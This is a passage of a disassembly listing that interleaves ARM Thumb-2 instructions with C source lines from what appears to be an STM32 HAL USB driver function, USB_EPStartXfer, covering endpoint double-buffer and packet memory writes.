 80074e4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074e8:	681b      	ldr	r3, [r3, #0]
 80074ea:	6a1b      	ldr	r3, [r3, #32]
 80074ec:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 80074f0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074f4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80074f8:	681a      	ldr	r2, [r3, #0]
 80074fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007502:	681b      	ldr	r3, [r3, #0]
 8007504:	781b      	ldrb	r3, [r3, #0]
 8007506:	009b      	lsls	r3, r3, #2
 8007508:	4413      	add	r3, r2
 800750a:	881b      	ldrh	r3, [r3, #0]
 800750c:	b29b      	uxth	r3, r3
 800750e:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 8007512:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007516:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 800751a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800751e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007522:	681a      	ldr	r2, [r3, #0]
 8007524:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007528:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800752c:	681b      	ldr	r3, [r3, #0]
 800752e:	781b      	ldrb	r3, [r3, #0]
 8007530:	009b      	lsls	r3, r3, #2
 8007532:	441a      	add	r2, r3
 8007534:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 8007538:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800753c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007540:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007544:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007548:	b29b      	uxth	r3, r3
 800754a:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 800754c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007550:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007554:	681b      	ldr	r3, [r3, #0]
 8007556:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007558:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800755c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007560:	681b      	ldr	r3, [r3, #0]
 8007562:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007566:	b29b      	uxth	r3, r3
 8007568:	461a      	mov	r2, r3
 800756a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800756c:	4413      	add	r3, r2
 800756e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007570:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007574:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007578:	681b      	ldr	r3, [r3, #0]
 800757a:	781b      	ldrb	r3, [r3, #0]
 800757c:	00da      	lsls	r2, r3, #3
 800757e:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007580:	4413      	add	r3, r2
 8007582:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007586:	65bb      	str	r3, [r7, #88]	; 0x58
 8007588:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800758c:	b29a      	uxth	r2, r3
 800758e:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8007590:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007592:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007596:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800759a:	681b      	ldr	r3, [r3, #0]
 800759c:	891b      	ldrh	r3, [r3, #8]
 800759e:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80075a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075a6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075aa:	681b      	ldr	r3, [r3, #0]
 80075ac:	6959      	ldr	r1, [r3, #20]
 80075ae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075b2:	b29b      	uxth	r3, r3
 80075b4:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80075b8:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80075bc:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80075c0:	6800      	ldr	r0, [r0, #0]
 80075c2:	f001 f82a 	bl	800861a <USB_WritePMA>
 80075c6:	e1b3      	b.n	8007930 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 80075c8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075cc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075d0:	681b      	ldr	r3, [r3, #0]
 80075d2:	6a1a      	ldr	r2, [r3, #32]
 80075d4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075d8:	1ad2      	subs	r2, r2, r3
 80075da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075de:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075e2:	681b      	ldr	r3, [r3, #0]
 80075e4:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 80075e6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075ea:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075ee:	681a      	ldr	r2, [r3, #0]
 80075f0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075f4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075f8:	681b      	ldr	r3, [r3, #0]
 80075fa:	781b      	ldrb	r3, [r3, #0]
 80075fc:	009b      	lsls	r3, r3, #2
 80075fe:	4413      	add	r3, r2
 8007600:	881b      	ldrh	r3, [r3, #0]
 8007602:	b29b      	uxth	r3, r3
 8007604:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007608:	2b00      	cmp	r3, #0
 800760a:	f000 80c6 	beq.w	800779a <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 800760e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007612:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007616:	681b      	ldr	r3, [r3, #0]
 8007618:	673b      	str	r3, [r7, #112]	; 0x70
 800761a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800761e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007622:	681b      	ldr	r3, [r3, #0]
 8007624:	785b      	ldrb	r3, [r3, #1]
 8007626:	2b00      	cmp	r3, #0
 8007628:	d177      	bne.n	800771a <USB_EPStartXfer+0xb18>
 800762a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800762e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007632:	681b      	ldr	r3, [r3, #0]
 8007634:	66bb      	str	r3, [r7, #104]	; 0x68
 8007636:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800763a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800763e:	681b      	ldr	r3, [r3, #0]
 8007640:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007644:	b29b      	uxth	r3, r3
 8007646:	461a      	mov	r2, r3
 8007648:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800764a:	4413      	add	r3, r2
 800764c:	66bb      	str	r3, [r7, #104]	; 0x68
 800764e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007652:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007656:	681b      	ldr	r3, [r3, #0]
 8007658:	781b      	ldrb	r3, [r3, #0]
 800765a:	00da      	lsls	r2, r3, #3
 800765c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800765e:	4413      	add	r3, r2
 8007660:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007664:	667b      	str	r3, [r7, #100]	; 0x64
 8007666:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007668:	881b      	ldrh	r3, [r3, #0]
 800766a:	b29b      	uxth	r3, r3
 800766c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007670:	b29a      	uxth	r2, r3
 8007672:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007674:	801a      	strh	r2, [r3, #0]
 8007676:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800767a:	2b3e      	cmp	r3, #62	; 0x3e
 800767c:	d921      	bls.n	80076c2 <USB_EPStartXfer+0xac0>
 800767e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007682:	095b      	lsrs	r3, r3, #5
 8007684:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007688:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800768c:	f003 031f 	and.w	r3, r3, #31
 8007690:	2b00      	cmp	r3, #0
 8007692:	d104      	bne.n	800769e <USB_EPStartXfer+0xa9c>
 8007694:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007698:	3b01      	subs	r3, #1
 800769a:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 800769e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076a0:	881b      	ldrh	r3, [r3, #0]
 80076a2:	b29a      	uxth	r2, r3
 80076a4:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80076a8:	b29b      	uxth	r3, r3
 80076aa:	029b      	lsls	r3, r3, #10
 80076ac:	b29b      	uxth	r3, r3
 80076ae:	4313      	orrs	r3, r2
 80076b0:	b29b      	uxth	r3, r3
 80076b2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80076b6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80076ba:	b29a      	uxth	r2, r3
 80076bc:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076be:	801a      	strh	r2, [r3, #0]
 80076c0:	e050      	b.n	8007764 <USB_EPStartXfer+0xb62>
 80076c2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076c6:	2b00      	cmp	r3, #0
 80076c8:	d10a      	bne.n	80076e0 <USB_EPStartXfer+0xade>
 80076ca:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076cc:	881b      	ldrh	r3, [r3, #0]
 80076ce:	b29b      	uxth	r3, r3
 80076d0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80076d4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80076d8:	b29a      	uxth	r2, r3
 80076da:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80076dc:	801a      	strh	r2, [r3, #0]
 80076de:	e041      	b.n	8007764 <USB_EPStartXfer+0xb62>
 80076e0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076e4:	085b      	lsrs	r3, r3, #1
 80076e6:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80076ea:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076ee:	f003 0301 	and.w	r3, r3, #1
 80076f2:	2b00      	cmp	r3, #0
 80076f4:	d004      	beq.n	8007700 <USB_EPStartXfer+0xafe>
 80076f6:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80076fa:	3301      	adds	r3, #1
 80076fc:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007700:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007702:	881b      	ldrh	r3, [r3, #0]
 8007704:	b29a      	uxth	r2, r3
 8007706:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 800770a:	b29b      	uxth	r3, r3
 800770c:	029b      	lsls	r3, r3, #10
 800770e:	b29b      	uxth	r3, r3
 8007710:	4313      	orrs	r3, r2
 8007712:	b29a      	uxth	r2, r3
 8007714:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007716:	801a      	strh	r2, [r3, #0]
 8007718:	e024      	b.n	8007764 <USB_EPStartXfer+0xb62>
 800771a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800771e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007722:	681b      	ldr	r3, [r3, #0]
 8007724:	785b      	ldrb	r3, [r3, #1]
 8007726:	2b01      	cmp	r3, #1
 8007728:	d11c      	bne.n	8007764 <USB_EPStartXfer+0xb62>
 800772a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800772e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007732:	681b      	ldr	r3, [r3, #0]
 8007734:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007738:	b29b      	uxth	r3, r3
 800773a:	461a      	mov	r2, r3
 800773c:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800773e:	4413      	add	r3, r2
 8007740:	673b      	str	r3, [r7, #112]	; 0x70
 8007742:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007746:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800774a:	681b      	ldr	r3, [r3, #0]
 800774c:	781b      	ldrb	r3, [r3, #0]
 800774e:	00da      	lsls	r2, r3, #3
 8007750:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8007752:	4413      	add	r3, r2
 8007754:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007758:	66fb      	str	r3, [r7, #108]	; 0x6c
 800775a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800775e:	b29a      	uxth	r2, r3
 8007760:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8007762:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 8007764:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007768:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800776c:	681b      	ldr	r3, [r3, #0]
 800776e:	895b      	ldrh	r3, [r3, #10]
 8007770:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007774:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007778:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800777c:	681b      	ldr	r3, [r3, #0]
 800777e:	6959      	ldr	r1, [r3, #20]
 8007780:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007784:	b29b      	uxth	r3, r3
 8007786:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800778a:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800778e:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007792:	6800      	ldr	r0, [r0, #0]
 8007794:	f000 ff41 	bl	800861a <USB_WritePMA>
 8007798:	e0ca      	b.n	8007930 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 800779a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800779e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077a2:	681b      	ldr	r3, [r3, #0]
 80077a4:	785b      	ldrb	r3, [r3, #1]
 80077a6:	2b00      	cmp	r3, #0
 80077a8:	d177      	bne.n	800789a <USB_EPStartXfer+0xc98>
 80077aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077ae:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077b2:	681b      	ldr	r3, [r3, #0]
 80077b4:	67fb      	str	r3, [r7, #124]	; 0x7c
 80077b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077ba:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077be:	681b      	ldr	r3, [r3, #0]
 80077c0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80077c4:	b29b      	uxth	r3, r3
 80077c6:	461a      	mov	r2, r3
 80077c8:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80077ca:	4413      	add	r3, r2
 80077cc:	67fb      	str	r3, [r7, #124]	; 0x7c
 80077ce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077d2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077d6:	681b      	ldr	r3, [r3, #0]
 80077d8:	781b      	ldrb	r3, [r3, #0]
 80077da:	00da      	lsls	r2, r3, #3
 80077dc:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80077de:	4413      	add	r3, r2
 80077e0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80077e4:	67bb      	str	r3, [r7, #120]	; 0x78
 80077e6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80077e8:	881b      	ldrh	r3, [r3, #0]
 80077ea:	b29b      	uxth	r3, r3
 80077ec:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80077f0:	b29a      	uxth	r2, r3
 80077f2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80077f4:	801a      	strh	r2, [r3, #0]
 80077f6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077fa:	2b3e      	cmp	r3, #62	; 0x3e
 80077fc:	d921      	bls.n	8007842 <USB_EPStartXfer+0xc40>
 80077fe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007802:	095b      	lsrs	r3, r3, #5
 8007804:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007808:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800780c:	f003 031f 	and.w	r3, r3, #31
 8007810:	2b00      	cmp	r3, #0
 8007812:	d104      	bne.n	800781e <USB_EPStartXfer+0xc1c>
 8007814:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007818:	3b01      	subs	r3, #1
 800781a:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800781e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007820:	881b      	ldrh	r3, [r3, #0]
 8007822:	b29a      	uxth	r2, r3
 8007824:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007828:	b29b      	uxth	r3, r3
 800782a:	029b      	lsls	r3, r3, #10
 800782c:	b29b      	uxth	r3, r3
 800782e:	4313      	orrs	r3, r2
 8007830:	b29b      	uxth	r3, r3
 8007832:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007836:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800783a:	b29a      	uxth	r2, r3
 800783c:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800783e:	801a      	strh	r2, [r3, #0]
 8007840:	e05c      	b.n	80078fc <USB_EPStartXfer+0xcfa>
 8007842:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007846:	2b00      	cmp	r3, #0
 8007848:	d10a      	bne.n	8007860 <USB_EPStartXfer+0xc5e>
 800784a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800784c:	881b      	ldrh	r3, [r3, #0]
 800784e:	b29b      	uxth	r3, r3
 8007850:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007854:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007858:	b29a      	uxth	r2, r3
 800785a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800785c:	801a      	strh	r2, [r3, #0]
 800785e:	e04d      	b.n	80078fc <USB_EPStartXfer+0xcfa>
 8007860:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007864:	085b      	lsrs	r3, r3, #1
 8007866:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 800786a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800786e:	f003 0301 	and.w	r3, r3, #1
 8007872:	2b00      	cmp	r3, #0
 8007874:	d004      	beq.n	8007880 <USB_EPStartXfer+0xc7e>
 8007876:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 800787a:	3301      	adds	r3, #1
 800787c:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007880:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007882:	881b      	ldrh	r3, [r3, #0]
 8007884:	b29a      	uxth	r2, r3
 8007886:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 800788a:	b29b      	uxth	r3, r3
 800788c:	029b      	lsls	r3, r3, #10
 800788e:	b29b      	uxth	r3, r3
 8007890:	4313      	orrs	r3, r2
 8007892:	b29a      	uxth	r2, r3
 8007894:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007896:	801a      	strh	r2, [r3, #0]
 8007898:	e030      	b.n	80078fc <USB_EPStartXfer+0xcfa>
 800789a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800789e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078a2:	681b      	ldr	r3, [r3, #0]
 80078a4:	785b      	ldrb	r3, [r3, #1]
 80078a6:	2b01      	cmp	r3, #1
 80078a8:	d128      	bne.n	80078fc <USB_EPStartXfer+0xcfa>
 80078aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078ae:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078b2:	681b      	ldr	r3, [r3, #0]
 80078b4:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80078b8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078bc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078c0:	681b      	ldr	r3, [r3, #0]
 80078c2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80078c6:	b29b      	uxth	r3, r3
 80078c8:	461a      	mov	r2, r3
 80078ca:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80078ce:	4413      	add	r3, r2
 80078d0:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80078d4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078d8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078dc:	681b      	ldr	r3, [r3, #0]
 80078de:	781b      	ldrb	r3, [r3, #0]
 80078e0:	00da      	lsls	r2, r3, #3
 80078e2:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80078e6:	4413      	add	r3, r2
 80078e8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80078ec:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80078f0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078f4:	b29a      	uxth	r2, r3
 80078f6:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80078fa:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 80078fc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007900:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007904:	681b      	ldr	r3, [r3, #0]
 8007906:	891b      	ldrh	r3, [r3, #8]
 8007908:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800790c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007910:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007914:	681b      	ldr	r3, [r3, #0]
 8007916:	6959      	ldr	r1, [r3, #20]
 8007918:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800791c:	b29b      	uxth	r3, r3
 800791e:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007922:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007926:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800792a:	6800      	ldr	r0, [r0, #0]
 800792c:	f000 fe75 	bl	800861a <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 8007930:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007934:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007938:	681a      	ldr	r2, [r3, #0]
 800793a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800793e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007942:	681b      	ldr	r3, [r3, #0]
 8007944:	781b      	ldrb	r3, [r3, #0]
 8007946:	009b      	lsls	r3, r3, #2
 8007948:	4413      	add	r3, r2
 800794a:	881b      	ldrh	r3, [r3, #0]
 800794c:	b29b      	uxth	r3, r3
 800794e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007952:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8007956:	817b      	strh	r3, [r7, #10]
 8007958:	897b      	ldrh	r3, [r7, #10]
 800795a:	f083 0310 	eor.w	r3, r3, #16
 800795e:	817b      	strh	r3, [r7, #10]
 8007960:	897b      	ldrh	r3, [r7, #10]
 8007962:	f083 0320 	eor.w	r3, r3, #32
 8007966:	817b      	strh	r3, [r7, #10]
 8007968:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800796c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007970:	681a      	ldr	r2, [r3, #0]
 8007972:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007976:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800797a:	681b      	ldr	r3, [r3, #0]
 800797c:	781b      	ldrb	r3, [r3, #0]
 800797e:	009b      	lsls	r3, r3, #2
 8007980:	441a      	add	r2, r3
 8007982:	897b      	ldrh	r3, [r7, #10]
 8007984:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007988:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800798c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007990:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007994:	b29b      	uxth	r3, r3
 8007996:	8013      	strh	r3, [r2, #0]
 8007998:	f000 bcde 	b.w	8008358 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 800799c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079a0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079a4:	681b      	ldr	r3, [r3, #0]
 80079a6:	7b1b      	ldrb	r3, [r3, #12]
 80079a8:	2b00      	cmp	r3, #0
 80079aa:	f040 80bb 	bne.w	8007b24 <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 80079ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079b2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079b6:	681b      	ldr	r3, [r3, #0]
 80079b8:	699a      	ldr	r2, [r3, #24]
 80079ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079c2:	681b      	ldr	r3, [r3, #0]
 80079c4:	691b      	ldr	r3, [r3, #16]
 80079c6:	429a      	cmp	r2, r3
 80079c8:	d917      	bls.n	80079fa <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 80079ca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079d2:	681b      	ldr	r3, [r3, #0]
 80079d4:	691b      	ldr	r3, [r3, #16]
 80079d6:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 80079da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079de:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079e2:	681b      	ldr	r3, [r3, #0]
 80079e4:	699a      	ldr	r2, [r3, #24]
 80079e6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80079ea:	1ad2      	subs	r2, r2, r3
 80079ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079f0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079f4:	681b      	ldr	r3, [r3, #0]
 80079f6:	619a      	str	r2, [r3, #24]
 80079f8:	e00e      	b.n	8007a18 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 80079fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a02:	681b      	ldr	r3, [r3, #0]
 8007a04:	699b      	ldr	r3, [r3, #24]
 8007a06:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 8007a0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a0e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a12:	681b      	ldr	r3, [r3, #0]
 8007a14:	2200      	movs	r2, #0
 8007a16:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 8007a18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a1c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a20:	681b      	ldr	r3, [r3, #0]
